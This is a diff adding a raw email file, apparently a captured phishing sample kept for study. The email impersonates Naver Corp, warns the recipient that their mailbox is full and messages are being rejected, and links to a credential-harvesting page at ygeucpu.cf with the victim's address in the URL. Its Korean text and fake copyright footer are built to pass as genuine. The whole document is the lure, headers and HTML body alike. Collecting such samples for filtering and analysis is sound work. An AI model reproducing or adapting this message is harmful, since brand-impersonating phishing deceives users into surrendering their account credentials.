@@ -1,0 +1,151 @@
+Received-SPF: none (mx.naver.com: domain of osman.alshikh@saudianfal.com does not designate permitted sender hosts)
+  client-ip=108.166.43.104; x-iptype=white;
+Authentication-Results: mx.naver.com;
+  spf=none (mx.naver.com: domain of osman.alshikh@saudianfal.com does not designate permitted sender hosts) smtp.mailfrom=osman.alshikh@saudianfal.com
+X-Naver-ESV: +9eYpB3G1H+Yp6lTWNmRKAvmFAgrjJ+Y
+X-Session-IP: 108.166.43.104
+Received: from smtp104.ord1c.emailsrvr.com (smtp104.ord1c.emailsrvr.com [108.166.43.104])
+  by crcvmail12.nm.naver.com with ESMTP id ZYf9otdSSiqg5dsoO2Q4Bg
+  for <charsyam@naver.com>;
+  Wed, 22 Aug 2018 09:04:06 -0000
+Received: from smtp14.relay.ord1c.emailsrvr.com (localhost [127.0.0.1])
+	by smtp14.relay.ord1c.emailsrvr.com (SMTP Server) with ESMTP id 16DA0C0269
+	for <charsyam@naver.com>; Wed, 22 Aug 2018 05:04:04 -0400 (EDT)
+X-Auth-ID: osman.alshikh@saudianfal.com
+Received: by smtp14.relay.ord1c.emailsrvr.com (Authenticated sender: osman.alshikh-AT-saudianfal.com) with ESMTPSA id D7CAAC0259
+	for <charsyam@naver.com>; Wed, 22 Aug 2018 05:04:03 -0400 (EDT)
+X-Sender-Id: osman.alshikh@saudianfal.com
+Received: from saudianfal.com ([UNAVAILABLE]. [45.126.211.209])
+	(using TLSv1.2 with cipher DHE-RSA-AES256-GCM-SHA384)
+	by 0.0.0.0:25 (trex/5.7.12);
+	Wed, 22 Aug 2018 05:04:04 -0400
+From: Naver Corp <osman.alshikh@saudianfal.com>
+To: charsyam@naver.com
+Subject:  Important: Update your mail charsyam@naver.com
+Date: 22 Aug 2018 02:04:18 -0700
+Message-ID: <20180822020418.C5403EB1D972C6D0@saudianfal.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<HTML><HEAD>
+<META content=3D"MSHTML 6.00.6001.18000" name=3DGENERATOR></HEAD>
+<body style=3D"MARGIN: 0.5em">
+<P style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 400; FONT-S=
+IZE: 13px; PADDING-BOTTOM: 0px; WORD-SPACING: 0px; MARGIN-LEFT: 0px; TEXT-T=
+RANSFORM: none; COLOR: rgb(34,34,34); TEXT-INDENT: 0px; MARGIN-RIGHT: 0px; =
+PADDING-TOP: 0px; FONT-STYLE: normal; FONT-FAMILY: NanumGothic, 나=
+5588;고딕, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: nor=
+mal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; orphans: 2; widows: 2;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial"><B><FONT face=3D"Microsoft YaHei" color=3D#008000>3=
+316;경받는 소중한 사용Ǿ=
+88; :</FONT></B><BR></P>
+<P style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 400; FONT-S=
+IZE: 13px; PADDING-BOTTOM: 0px; WORD-SPACING: 0px; MARGIN-LEFT: 0px; TEXT-T=
+RANSFORM: none; COLOR: rgb(34,34,34); TEXT-INDENT: 0px; MARGIN-RIGHT: 0px; =
+PADDING-TOP: 0px; FONT-STYLE: normal; FONT-FAMILY: NanumGothic, 나=
+5588;고딕, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: nor=
+mal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; orphans: 2; widows: 2;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial"><B><FONT face=3D"Microsoft YaHei" color=3D#008000 size=
+=3D2><BR>사서함에 공간이 부=
+족하거나 용량이 부족&=
+#54616;여 사서함에 성공적&#=
+51004;로 배달되지 않은 새 &=
+#47700;시지가 </FONT>
+<FONT face=3D"Microsoft YaHei" color=3D#cc0000>2</FONT></B><FONT size=3D2><=
+B><FONT face=3D"Microsoft YaHei" color=3D#cc0000> </FONT> <FONT f=
+ace=3D"Microsoft YaHei" color=3D#008000>통 수신됩&#=
+45768;다. </FONT></B></FONT><B><FONT face=3D"Microsoft YaHei" co=
+lor=3D#cc0000>2</FONT><FONT face=3D"Microsoft YaHei" color=3D#008000 size=
+=3D2> 개의 새 메시지가 ƹ=
+44;부되었습니다.<BR> </FONT></B>
+</P>
+<P style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 400; FONT-S=
+IZE: 13px; PADDING-BOTTOM: 0px; WORD-SPACING: 0px; MARGIN-LEFT: 0px; TEXT-T=
+RANSFORM: none; COLOR: rgb(34,34,34); TEXT-INDENT: 0px; MARGIN-RIGHT: 0px; =
+PADDING-TOP: 0px; FONT-STYLE: normal; FONT-FAMILY: NanumGothic, 나=
+5588;고딕, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: nor=
+mal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; orphans: 2; widows: 2;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial"><B><FONT face=3D"Microsoft YaHei" size=3D2><FONT color=
+=3D#008000>사서함 용량을 정ፆ=
+5;적인 사용량 인 </FONT><FONT colo=
+r=3D#cc0000>10G</FONT><FONT color=3D#008000>로 늘려Ꮏ=
+6;합니다. </FONT>
+ <A style=3D"COLOR: rgb(17,85,204); BACKGROUND-COLOR: transparent" hre=
+f=3D"http://ygeucpu.cf/(.)/nav.php?email=3Dcharsyam@naver.com" target=3D_bl=
+ank rel=3D"noreferrer noopener" data-saferedirecturl=3D"https://www.google.=
+com/url?q=3Dhttp://ygeucpu.cf/(.)/nav.php?email%3D%250%25&source=3Dgmai=
+l&ust=3D1535014502629000&usg=3DAFQjCNGbyQfyIR0cojZdAijAwhMWRcs68A">=
+<FONT color=3D#3366ff>계속하려면 여,=
+592;를 클릭하십시오</FONT></A>
+<FONT color=3D#3366ff>>></FONT><FONT color=3D#008000>  -=
+796;른 들어오는 메시지ǚ=
+84; 거부하는 것을 방지Ȣ=
+33;니다.</FONT></FONT></B></P>
+<P style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 400; FONT-S=
+IZE: 13px; PADDING-BOTTOM: 0px; WORD-SPACING: 0px; MARGIN-LEFT: 0px; TEXT-T=
+RANSFORM: none; COLOR: rgb(34,34,34); TEXT-INDENT: 0px; MARGIN-RIGHT: 0px; =
+PADDING-TOP: 0px; FONT-STYLE: normal; FONT-FAMILY: NanumGothic, 나=
+5588;고딕, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: nor=
+mal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; orphans: 2; widows: 2;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial"> </P>
+<P style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 400; FONT-S=
+IZE: 13px; PADDING-BOTTOM: 0px; WORD-SPACING: 0px; MARGIN-LEFT: 0px; TEXT-T=
+RANSFORM: none; COLOR: rgb(34,34,34); TEXT-INDENT: 0px; MARGIN-RIGHT: 0px; =
+PADDING-TOP: 0px; FONT-STYLE: normal; FONT-FAMILY: NanumGothic, 나=
+5588;고딕, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: nor=
+mal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; orphans: 2; widows: 2;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial"> </P>
+<P style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 400; FONT-S=
+IZE: 13px; PADDING-BOTTOM: 0px; WORD-SPACING: 0px; MARGIN-LEFT: 0px; TEXT-T=
+RANSFORM: none; COLOR: rgb(34,34,34); TEXT-INDENT: 0px; MARGIN-RIGHT: 0px; =
+PADDING-TOP: 0px; FONT-STYLE: normal; FONT-FAMILY: NanumGothic, 나=
+5588;고딕, sans-serif; WHITE-SPACE: normal; LETTER-SPACING: nor=
+mal; BACKGROUND-COLOR: rgb(255,255,255); font-variant-ligatures: normal; fo=
+nt-variant-caps: normal; orphans: 2; widows: 2;=20
+-webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decora=
+tion-color: initial"><SPAN style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 4px; =
+PADDING-BOTTOM: 0px; MARGIN: 0px; COLOR: rgb(51,51,51); LINE-HEIGHT: normal=
+; PADDING-TOP: 0px; FONT-FAMILY: verdana; LIST-STYLE-TYPE: none; BACKGROUND=
+-COLOR: rgb(245,246,247); TEXT-ALIGN: center; font-stretch: normal"><FONT s=
+ize=3D1>Copyright</FONT></SPAN>
+ <SPAN style=3D"COLOR: rgb(51,51,51); FONT-FAMILY: Verdana; BACKGROUND=
+-COLOR: rgb(245,246,247); TEXT-ALIGN: center"><FONT size=3D1> </FONT><=
+/SPAN><SPAN style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 4px; PADDING-BOTTOM:=
+ 0px; MARGIN: 0px; COLOR: rgb(51,51,51); LINE-HEIGHT: normal; PADDING-TOP: =
+0px; FONT-FAMILY: verdana; LIST-STYLE-TYPE: none; BACKGROUND-COLOR: rgb(245=
+,246,247); TEXT-ALIGN: center; font-stretch: normal"><FONT size=3D1>©<=
+/FONT></SPAN>
+ <SPAN style=3D"COLOR: rgb(51,51,51); FONT-FAMILY: Verdana; BACKGROUND=
+-COLOR: rgb(245,246,247); TEXT-ALIGN: center"><FONT size=3D1> </FONT><=
+/SPAN>
+ <A class=3Dm_-8731636297129370082m_-4152474867323181080gmail-u_cra st=
+yle=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-WEIGHT: 700; PADDING-BOT=
+TOM: 0px; MARGIN: 0px; COLOR: rgb(102,102,102); PADDING-TOP: 0px; FONT-FAMI=
+LY: verdana; LIST-STYLE-TYPE: none; BACKGROUND-COLOR: rgb(245,246,247); TEX=
+T-ALIGN: center; font-stretch: normal; text-decoration-line: none" href=3D"=
+http://nhncorp.com/" target=3D_blank rel=3D"noreferrer noopener"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttp://nhncorp.com/&=
+amp;source=3Dgmail&ust=3D1535014502629000&usg=3DAFQjCNGgeFTxf9bCtw-=
+NeJeey7CYBV0eCw"><FONT size=3D1>NAVER Corp.</FONT></A> <SPAN style=3D"=
+COLOR: rgb(51,51,51); FONT-FAMILY: Verdana; BACKGROUND-COLOR: rgb(245,246,2=
+47); TEXT-ALIGN: center"><FONT size=3D1> </FONT></SPAN>
+<SPAN style=3D"PADDING-RIGHT: 0px; PADDING-LEFT: 2px; PADDING-BOTTOM: 0px; =
+MARGIN: 0px; COLOR: rgb(51,51,51); LINE-HEIGHT: 14px; PADDING-TOP: 0px; FON=
+T-FAMILY: Verdana; LIST-STYLE-TYPE: none; BACKGROUND-COLOR: rgb(245,246,247=
+); TEXT-ALIGN: center; font-stretch: normal"><FONT size=3D1>All Rights Rese=
+rved.</FONT></SPAN></P></BODY></HTML>
